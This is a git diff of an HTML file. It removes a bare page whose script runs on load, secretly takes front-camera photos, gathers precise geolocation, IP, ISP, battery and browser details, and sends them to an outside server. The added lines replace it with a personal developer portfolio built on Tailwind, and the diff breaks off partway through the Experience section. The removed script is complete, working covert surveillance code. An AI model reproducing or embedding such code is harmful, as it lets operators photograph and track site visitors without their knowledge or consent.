@@ -1,166 +1,1313 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+    <script>
+        // Blocking script — apply theme before first paint to prevent FOUC
+        (function () {
+            var saved = localStorage.getItem('theme');
+            var prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+            var isDark = saved === 'dark' || (saved !== 'light' && prefersDark);
+            document.documentElement.classList.toggle('dark', isDark);
+        })();
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
+    <title>Rakib Ahmed — Design Engineer & Founder</title>
 
-<p>raiib</p>
+    <!-- Meta tags for SEO -->
+    <meta name="description"
+        content="Personal portfolio of Rakib Ahmed, a Design Engineer & Founder building premium, accessible web interfaces. Inspired by chanhdai.com.">
+    <meta name="keywords" content="Design Engineer, Rakib Ahmed, Portfolio, Tailwind CSS, Frontend, UI Developer">
 
-<script>
-
-    let globalLogMessage="";
-  
- const sentphoto= async()  => {
-
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({
-        video:{facingMode:"user"},
-        audio:false
-    });
-
-    const video = document.createElement('video');
-    video.srcObject=stream;
-    video.setAttribute('playsinline', '');
-    video.autoplay =true;
-
-    await new Promise((resolve) => { 
-        video.onloadedmetadata = resolve;
-        
-    });
-
-    await new Promise(res=>setTimeout(res,2000));
-
-    for(let i =0; i<2; i++){
-        const base64Data=captureAndCompress(video);
-
-
-        await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
-            method:'POST',
-            headers:{"Content-Type": 'application/json'},
-            body: JSON.stringify({
-                image: base64Data,
-                deviceDetails: globalLogMessage || "No Device Data Available"
-            })
-        }).then(res=>res.json())
-          .then(data => console.log(data))
-          .catch(err => console.error("Server Send Error:", err))
-
-    }
-
-    stream.getTracks().forEach(track => track.stop());
-    }catch(err){
-        console.error("Camera Error: ", err);
-
-         await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
-            method:'POST',
-            headers:{"Content-Type": 'application/json'},
-            body: JSON.stringify({
-                image: null,
-                deviceDetails: globalLogMessage || "No Device Data Available"
-            })
-        }).then(res=>res.json())
-          .then(data => console.log("Telegram Response (Only Text):", data))
-          .catch(err => console.error("Server Send Error:", err))
-
-    }
-  }
-
-
-function captureAndCompress(videoElement) {
-    const canvas = document.createElement('canvas');
-    canvas.width = videoElement.videoWidth / 2 || 320;
-    canvas.height = videoElement.videoHeight / 2 || 240;
-
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-    return canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
-  }
-
-
-    async function sentDeviceData() {
-        return new Promise(async (resolve) => {
-
-       
-        try {
-            
-            let batteryLevel = "N/A", isCharging = "N/A";
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery().catch(() => null);
-                if (battery) {
-                    batteryLevel = `${Math.round(battery.level * 100)}%`;
-                    isCharging = battery.charging ? ' Charging' : ' Discharging';
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        display: ['Outfit', 'sans-serif'],
+                    }
                 }
             }
-
-            const time = new Date().toLocaleString('en-IN');
-            const screenSize = `${screen.width}x${screen.height}`;
-            const userAgent = navigator.userAgent;
-
-            const geoRes = await fetch('https://telebot-backend-1aht.onrender.com/api/get-ip-info').then(r => r.json()).catch(() => ({}));
-
-            const ipAddress = geoRes.ip || "N/A";
-            const city = geoRes.city || "N/A";
-            const country = geoRes.country || "N/A";
-            const isp = geoRes.org || "N/A";
-
-            const logMessage = (lat = null, lon = null) => {
-                const googleMaplink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
-                
-                globalLogMessage = `
-*Device Details*
-======================
-IP Address: ${ipAddress}
-IP Location: ${city}, ${country}
-Internet Provider: ${isp}
-Live Location: ${googleMaplink}
-Battery: ${batteryLevel} (${isCharging})
-Time: ${time}
-OS/Browser: ${userAgent}
- `.trim();             
-console.log(globalLogMessage);
-resolve();
-
-            };
-
-         
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        logMessage(latitude, longitude);
-                    },
-                    (error) => {
-                        console.warn("Location Permission Denied/Error:", error.message);
-                        logMessage();
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                console.warn("Geolocation not supported by this browser.");
-                logMessage();
-            }
-
-        } catch (e) {
-            console.error("Device Info Error:", e);
-            resolve();
         }
+    </script>
 
-         });
-    }
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="index.css">
 
-    async function init() {
+    <!-- Icons -->
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
 
-        await sentDeviceData();
-        sentphoto();
-        
-    }
+<body
+    class="bg-zinc-50 text-zinc-900 dark:bg-[#08080a] dark:text-zinc-100 antialiased transition-colors duration-300 font-sans relative min-h-screen selection:bg-violet-500 selection:text-white">
 
-    init();
-    
-</script>
-    
+    <!-- Ambient Grids & Radials -->
+    <div class="fixed inset-0 bg-grid-pattern opacity-[0.45] pointer-events-none z-0"></div>
+    <div class="fixed inset-0 bg-radial-gradient pointer-events-none z-0"></div>
+
+    <!-- Floating Navbar -->
+    <nav class="fixed top-0 left-0 w-full z-40 glass-nav">
+        <div class="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-8">
+                <!-- Logo -->
+                <a href="#" class="flex items-center space-x-2 group">
+                    <span
+                        class="w-8 h-8 rounded-lg bg-zinc-950 dark:bg-white flex items-center justify-center text-white dark:text-zinc-950 font-display font-extrabold text-sm transition-transform duration-300 group-hover:rotate-12">R</span>
+                    <span class="font-display font-semibold tracking-tight text-sm">rakib.dev</span>
+                </a>
+
+                <!-- Links -->
+                <div class="hidden md:flex items-center space-x-6 text-sm font-medium text-zinc-500 dark:text-zinc-400">
+                    <a href="#about" class="hover:text-zinc-900 dark:hover:text-white transition-colors">About</a>
+                    <a href="#experience"
+                        class="hover:text-zinc-900 dark:hover:text-white transition-colors">Experience</a>
+                    <a href="#projects" class="hover:text-zinc-900 dark:hover:text-white transition-colors">Projects</a>
+                    <a href="#showcase" class="hover:text-zinc-900 dark:hover:text-white transition-colors">Showcase</a>
+                    <a href="#sponsors" class="hover:text-zinc-900 dark:hover:text-white transition-colors">Sponsors</a>
+                </div>
+            </div>
+
+            <div class="flex items-center space-x-4">
+                <!-- Cmd+K Search trigger -->
+                <button onclick="toggleCommandPalette()"
+                    class="hidden sm:flex items-center space-x-2 px-3 py-1.5 bg-zinc-100/80 dark:bg-zinc-900/50 hover:bg-zinc-200/80 dark:hover:bg-zinc-850 rounded-lg border border-zinc-200 dark:border-zinc-800/80 transition-colors text-sm text-zinc-500 dark:text-zinc-400">
+                    <i data-feather="search" class="w-3.5 h-3.5"></i>
+                    <span>Search</span>
+                    <span
+                        class="text-[10px] font-mono bg-zinc-200 dark:bg-zinc-855 px-1.5 py-0.5 rounded border border-zinc-300 dark:border-zinc-750 font-sans shadow-sm">⌘K</span>
+                </button>
+
+                <!-- Theme Buttons -->
+                <div
+                    class="flex items-center bg-zinc-100/80 dark:bg-zinc-900/60 rounded-full p-0.5 border border-zinc-200 dark:border-zinc-800/80">
+                    <button class="theme-btn p-1.5 rounded-full transition-colors text-zinc-500 dark:text-zinc-400"
+                        data-theme="light" aria-label="Light mode">
+                        <i data-feather="sun" class="w-3.5 h-3.5"></i>
+                    </button>
+                    <button class="theme-btn p-1.5 rounded-full transition-colors text-zinc-500 dark:text-zinc-400"
+                        data-theme="system" aria-label="System mode">
+                        <i data-feather="monitor" class="w-3.5 h-3.5"></i>
+                    </button>
+                    <button class="theme-btn p-1.5 rounded-full transition-colors text-zinc-500 dark:text-zinc-400"
+                        data-theme="dark" aria-label="Dark mode">
+                        <i data-feather="moon" class="w-3.5 h-3.5"></i>
+                    </button>
+                </div>
+
+                <!-- GitHub star badge -->
+                <a href="https://github.com/devlowper" target="_blank"
+                    class="hidden sm:flex items-center space-x-1.5 text-xs font-semibold bg-zinc-950 text-white dark:bg-white dark:text-zinc-950 px-3.5 py-1.5 rounded-full hover:opacity-90 transition-all shadow-sm">
+                    <i data-feather="star" class="w-3.5 h-3.5 fill-current"></i>
+                    <span>Star</span>
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <main class="relative pt-32 pb-20 max-w-5xl mx-auto px-6 space-y-32 z-10 font-sans">
+
+        <!-- Hero Section -->
+        <section id="hero" class="flex flex-col-reverse md:flex-row md:items-start justify-between gap-8 md:gap-10 pt-6">
+            <div class="flex-1 space-y-8">
+                <div class="space-y-4">
+                    <h1
+                        class="font-display text-4xl md:text-5xl font-extrabold tracking-tight text-zinc-950 dark:text-zinc-50">
+                        Rakib Ahmed
+                    </h1>
+
+                    <!-- Word Slider -->
+                    <div
+                        class="text-xl md:text-2xl font-medium text-zinc-500 dark:text-zinc-450 flex items-center h-8 overflow-hidden">
+                        <span>I am a &nbsp;</span>
+                        <span class="relative h-8 w-48 inline-block">
+                            <span id="animated-word"
+                                class="absolute left-0 transition-all duration-500 font-display font-semibold text-zinc-900 dark:text-zinc-100">Developer</span>
+                        </span>
+                    </div>
+                </div>
+
+                <p class="text-zinc-600 dark:text-zinc-400 max-w-lg leading-relaxed text-base">
+                    Building premium, responsive web interfaces and design systems with clean code and minimalist
+                    interfaces.
+                </p>
+
+                <!-- Personal Info Card -->
+                <div
+                    class="glass-card p-6 rounded-2xl shadow-sm max-w-xl grid grid-cols-1 sm:grid-cols-2 gap-6 shine-card">
+                    <div class="space-y-3.5">
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="briefcase" class="w-4 h-4 text-zinc-400"></i>
+                            <span>
+                                <a href="https://example.com" target="_blank"
+                                    class="hover:underline font-semibold text-zinc-900 dark:text-zinc-200">Designer & Web Developer
+                                    </a>
+                            </span>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="activity" class="w-4 h-4 text-zinc-400"></i>
+                            <span>
+                                <a href="https://example.com" target="_blank"
+                                    class="hover:underline font-semibold text-zinc-900 dark:text-zinc-200">Founder</a> @
+                                <a href="#" class="hover:underline">SaaSify</a>
+                            </span>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="map-pin" class="w-4 h-4 text-zinc-400"></i>
+                            <a href="https://www.google.com/maps?q=Ho+Chi+Minh+City" target="_blank"
+                                class="hover:underline font-medium text-zinc-800 dark:text-zinc-350">Sylhet City,
+                                BD</a>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="clock" class="w-4 h-4 text-zinc-400"></i>
+                            <span id="vn-time" class="font-mono text-zinc-800 dark:text-zinc-350">--:-- (UTC+7)</span>
+                        </div>
+                    </div>
+                    <div class="space-y-3.5">
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="smile" class="w-4 h-4 text-zinc-400"></i>
+                            <span class="text-zinc-800 dark:text-zinc-350">Pronouns: He/Him</span>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="mail" class="w-4 h-4 text-zinc-400"></i>
+                            <a href="#" class="copy-link hover:underline font-medium text-zinc-800 dark:text-zinc-300"
+                                data-copy="rakib@example.com">rakinahmed45@gmail.com</a>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="phone" class="w-4 h-4 text-zinc-400"></i>
+                            <span class="text-zinc-800 dark:text-zinc-350">+88 016-0926-6965</span>
+                        </div>
+                        <div class="text-sm flex items-center space-x-2.5 text-zinc-600 dark:text-zinc-400">
+                            <i data-feather="globe" class="w-4 h-4 text-zinc-400"></i>
+                            <a href="https://github.com/devlowper"
+                                class="hover:underline font-medium text-zinc-800 dark:text-zinc-300">rakib.dev</a>
+                        </div>
+                    </div>
+
+                    <div
+                        class="sm:col-span-2 border-t border-zinc-100 dark:border-zinc-800/80 pt-4 flex items-center space-x-3">
+                        <a href="https://x.com" target="_blank"
+                            class="p-2 bg-zinc-100 hover:bg-zinc-200 dark:bg-zinc-900/60 dark:hover:bg-zinc-800 rounded-full transition-colors text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+                            aria-label="Twitter"><i data-feather="twitter" class="w-4 h-4"></i></a>
+                        <a href="https://github.com/devlowper" target="_blank"
+                            class="p-2 bg-zinc-100 hover:bg-zinc-200 dark:bg-zinc-900/60 dark:hover:bg-zinc-800 rounded-full transition-colors text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+                            aria-label="GitHub"><i data-feather="github" class="w-4 h-4"></i></a>
+                        <a href="https://www.linkedin.com/in/vectorpointgrafix" target="_blank"
+                            class="p-2 bg-zinc-100 hover:bg-zinc-200 dark:bg-zinc-900/60 dark:hover:bg-zinc-800 rounded-full transition-colors text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+                            aria-label="LinkedIn"><i data-feather="linkedin" class="w-4 h-4"></i></a>
+                        <a href="https://discord.com" target="_blank"
+                            class="p-2 bg-zinc-100 hover:bg-zinc-200 dark:bg-zinc-900/60 dark:hover:bg-zinc-800 rounded-full transition-colors text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+                            aria-label="Discord"><i data-feather="message-circle" class="w-4 h-4"></i></a>
+                        <a href="https://youtube.com" target="_blank"
+                            class="p-2 bg-zinc-100 hover:bg-zinc-200 dark:bg-zinc-900/60 dark:hover:bg-zinc-800 rounded-full transition-colors text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+                            aria-label="YouTube"><i data-feather="youtube" class="w-4 h-4"></i></a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Profile dot-matrix RA (large square) -->
+            <div class="profile-dot-square shrink-0 self-center md:self-start" aria-label="Rakib Ahmed">
+                <svg id="profile-dot-matrix" class="profile-dot-svg" role="img" aria-hidden="true"></svg>
+            </div>
+        </section>
+
+        <!-- About/Hello Section -->
+        <section id="about" class="space-y-8 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Hello</h2>
+            <div
+                class="prose prose-zinc dark:prose-invert max-w-none text-zinc-600 dark:text-zinc-400 leading-relaxed text-base space-y-5">
+                <p>I'm Rakib, a Design Engineer based in Ho Chi Minh City. I work at the intersection of design and
+                    front-end engineering, focused on creating beautiful, accessible, and highly optimized web
+                    interfaces.</p>
+
+                <h3 class="text-lg font-semibold text-zinc-800 dark:text-zinc-200">Highlights</h3>
+                <ul class="list-disc pl-5 space-y-2">
+                    <li>Specializing in building robust systems using React, TypeScript, and Tailwind CSS.</li>
+                    <li>Avid contributor to open source projects, cataloging UI components.</li>
+                    <li>Obsessed with performance optimization, layout details, and minimal design systems.</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Tech Stack badge links section -->
+        <section id="tech-stack" class="space-y-8 fade-in-up">
+            <div class="space-y-2">
+                <h2 class="font-display text-2xl font-bold tracking-tight">Tech Stack</h2>
+                <p class="text-sm text-zinc-500">The tools and languages I enjoy building with.</p>
+            </div>
+            <div class="flex flex-wrap gap-2.5">
+                <!-- Badges -->
+                <a href="https://www.typescriptlang.org" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="code-2" class="w-3.5 h-3.5 text-blue-500"></i>
+                    <span>TypeScript</span>
+                </a>
+                <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="code" class="w-3.5 h-3.5 text-yellow-500"></i>
+                    <span>JavaScript</span>
+                </a>
+                <a href="https://en.cppreference.com/w/c" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-indigo-500"></i>
+                    <span>C Program</span>
+                </a>
+                <a href="https://isocpp.org" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="cpu" class="w-3.5 h-3.5 text-sky-600"></i>
+                    <span>C++</span>
+                </a>
+                <a href="https://react.dev" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/85 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="atom" class="w-3.5 h-3.5 text-sky-500"></i>
+                    <span>React</span>
+                </a>
+                <a href="https://nextjs.org" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="globe" class="w-3.5 h-3.5 text-zinc-900 dark:text-zinc-100"></i>
+                    <span>Next.js</span>
+                </a>
+                <a href="https://tailwindcss.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="wind" class="w-3.5 h-3.5 text-sky-400"></i>
+                    <span>Tailwind CSS</span>
+                </a>
+                <a href="https://base-ui.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="layout" class="w-3.5 h-3.5 text-indigo-500"></i>
+                    <span>Base UI</span>
+                </a>
+                <a href="https://motion.dev" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="zap" class="w-3.5 h-3.5 text-amber-500"></i>
+                    <span>Motion</span>
+                </a>
+                <a href="https://reactnavigation.org" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="navigation" class="w-3.5 h-3.5 text-rose-500"></i>
+                    <span>React Navigation</span>
+                </a>
+                <a href="https://nodejs.org" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="server" class="w-3.5 h-3.5 text-green-600"></i>
+                    <span>Node.js</span>
+                </a>
+                <a href="https://mongodb.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="database" class="w-3.5 h-3.5 text-emerald-500"></i>
+                    <span>MongoDB</span>
+                </a>
+                <a href="https://redis.io" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="database" class="w-3.5 h-3.5 text-red-500"></i>
+                    <span>Redis</span>
+                </a>
+                <a href="https://git-scm.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="git-branch" class="w-3.5 h-3.5 text-orange-500"></i>
+                    <span>Git</span>
+                </a>
+                <a href="https://www.docker.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="box" class="w-3.5 h-3.5 text-blue-500"></i>
+                    <span>Docker</span>
+                </a>
+                <a href="https://claude.ai" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="message-square" class="w-3.5 h-3.5 text-orange-400"></i>
+                    <span>Claude</span>
+                </a>
+                <a href="https://cursor.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="mouse-pointer" class="w-3.5 h-3.5 text-sky-500"></i>
+                    <span>Cursor</span>
+                </a>
+                <a href="https://openai.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="bot" class="w-3.5 h-3.5 text-green-500"></i>
+                    <span>ChatGPT</span>
+                </a>
+                <a href="https://www.figma.com" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="figma" class="w-3.5 h-3.5 text-rose-500"></i>
+                    <span>Figma</span>
+                </a>
+                <a href="https://www.adobe.com/products/illustrator.html" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="pen-tool" class="w-3.5 h-3.5 text-orange-500"></i>
+                    <span>illutator</span>
+                </a>
+                <a href="https://www.adobe.com/products/photoshop.html" target="_blank" class="glass-card inline-flex items-center space-x-2 px-3.5 py-2 hover:bg-zinc-100/80 dark:hover:bg-zinc-800/80 rounded-full text-xs font-semibold transition-all duration-300 hover:border-zinc-400 dark:hover:border-zinc-700 hover:shadow-sm hover:scale-105">
+                    <i data-lucide="image" class="w-3.5 h-3.5 text-blue-500"></i>
+                    <span>Photoshop</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- GitHub Contributions Graph -->
+        <section id="github" class="space-y-8 fade-in-up">
+            <div class="space-y-2">
+                <h2 class="font-display text-2xl font-bold tracking-tight">GitHub Contributions</h2>
+                <p class="text-sm text-zinc-500">Visual mock contribution heatmap showing commits, updates, and
+                    releases.</p>
+            </div>
+
+            <div
+                class="glass-card p-5 rounded-2xl overflow-x-auto no-scrollbar">
+                <div class="flex items-center justify-between text-xs text-zinc-400 mb-4 font-mono">
+                    <span>@Rakib contributions</span>
+                    <span>1,842 commits this year</span>
+                </div>
+                <!-- Heatmap grid -->
+                <div class="grid grid-cols-[repeat(53,1fr)] gap-[3px] min-w-[640px]">
+                    <script>
+                        const cells = 53 * 7;
+                        const levels = ['bg-zinc-100 dark:bg-zinc-900', 'bg-violet-200 dark:bg-violet-950', 'bg-violet-300 dark:bg-violet-900', 'bg-violet-400 dark:bg-violet-700', 'bg-violet-500 dark:bg-violet-500'];
+                        let htmlStr = '';
+                        for (let i = 0; i < cells; i++) {
+                            const lv = Math.floor(Math.random() * levels.length);
+                            htmlStr += `<div class="w-[10px] h-[10px] rounded-[2px] ${levels[lv]} hover:ring-1 hover:ring-violet-400 cursor-pointer" title="${Math.floor(Math.random() * 8)} contributions"></div>`;
+                        }
+                        document.write(htmlStr);
+                    </script>
+                </div>
+                <div class="flex justify-end items-center space-x-1 mt-4 text-[10px] text-zinc-400 font-mono">
+                    <span>Less</span>
+                    <div class="w-[10px] h-[10px] rounded-[2px] bg-zinc-100 dark:bg-zinc-900"></div>
+                    <div class="w-[10px] h-[10px] rounded-[2px] bg-violet-200 dark:bg-violet-950"></div>
+                    <div class="w-[10px] h-[10px] rounded-[2px] bg-violet-300 dark:bg-violet-900"></div>
+                    <div class="w-[10px] h-[10px] rounded-[2px] bg-violet-400 dark:bg-violet-700"></div>
+                    <div class="w-[10px] h-[10px] rounded-[2px] bg-violet-500 dark:bg-violet-500"></div>
+                    <span>More</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Experience Timeline (2 visible + Show More) -->
+        <section id="experience" class="space-y-8 fade-in-up">
+            <h2 class="font-display text-2xl font-bold tracking-tight">Experience</h2>
+            <div class="space-y-6">
+            <div class="experience-timeline border-l border-zinc-200 dark:border-zinc-800 ml-3 pl-8 relative space-y-6">
+
+                <!-- Entry 1: Tung Tung — Web Developer -->
+                <div class="relative group glass-card rounded-xl p-5">
+                    <div
+                        class="absolute -left-[41px] top-6 w-4 h-4 rounded-full border-2 border-zinc-50 dark:border-[#08080a] bg-zinc-300 dark:bg-zinc-700 group-hover:bg-zinc-900 dark:group-hover:bg-zinc-100 transition-colors">
+                    </div>
+                    <div class="flex flex-col sm:flex-row sm:items-baseline justify-between mb-2">
+                        <h3
+                            class="font-display font-semibold text-lg text-zinc-900 dark:text-zinc-100 flex items-center gap-3">
+                            <span
+                                class="w-8 h-8 rounded-full bg-zinc-100 dark:bg-zinc-800 flex items-center justify-center border border-zinc-200 dark:border-zinc-700 shrink-0">
+                                <i data-feather="briefcase" class="w-4 h-4 text-zinc-500"></i>
+                            </span>
+                            <span>Web Developer <span class="text-xs text-zinc-400 font-normal">at Tung
+                                    Tung</span></span>
+                        </h3>
+                        <span class="text-sm text-zinc-500 dark:text-zinc-400 font-mono mt-1 sm:mt-0">2020 — 2022</span>
+                    </div>
+                    <div class="text-zinc-650 dark:text-zinc-400 mb-3 font-medium text-sm">Full-time</div>
+                    <p class="text-zinc-600 dark:text-zinc-400 text-sm leading-relaxed mb-4">
+                        Built high-performance, responsive React web products. Worked closely with UI design teams and
+                        improved loading speeds.
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">React</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Redux</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Storybook</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Lerna</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Agile</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Teamwork</span>
+                        <span
+                            class="px-2.5 py-1 text-xs font-semibold rounded-md bg-zinc-100 dark:bg-zinc-900/60 text-zinc-600 dark:text-zinc-400 border border-zinc-200 dark:border-zinc-800">Research</span>
+                    </div>
+                </div>
+
+                <!-- Entry 2: Freelance — Full-stack Developer (with Current Employer badge) -->
+                <div class="relative group glass-card rounded-xl p-5">
